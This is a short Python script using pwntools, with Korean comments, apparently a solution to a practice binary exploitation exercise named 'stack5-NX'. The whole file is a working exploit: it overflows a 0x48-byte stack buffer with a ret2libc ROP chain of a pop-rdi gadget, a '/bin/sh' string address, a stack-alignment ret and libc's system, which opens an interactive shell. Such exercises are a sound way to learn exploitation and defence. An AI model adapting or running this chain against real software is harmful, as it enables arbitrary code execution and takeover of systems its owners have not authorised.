from pwn import *

p = process('./stack5-NX')

# 가젯 주소
pop_rdi_ret = 0x401203        # pop rdi ; ret
ret = 0x40101a           # ret (스택 정렬용)
binsh = 0x7ffff7f795bd   # /bin/sh 문자열 주소
libc_system = 0x7ffff7e17290  # system 함수 주소

# 페이로드 구성
payload = b'A' * 0x48     # 버퍼 채우기
payload += p64(pop_rdi_ret)   # pop rdi ; ret
payload += p64(binsh)     # rdi에 /bin/sh 주소 저장
payload += p64(ret)       # 스택 정렬
payload += p64(libc_system)  # system 함수 호출


p.recvline()   # 페이로드 전송
p.sendline(payload)

p.interactive()   # 인터랙티브 모드 시작
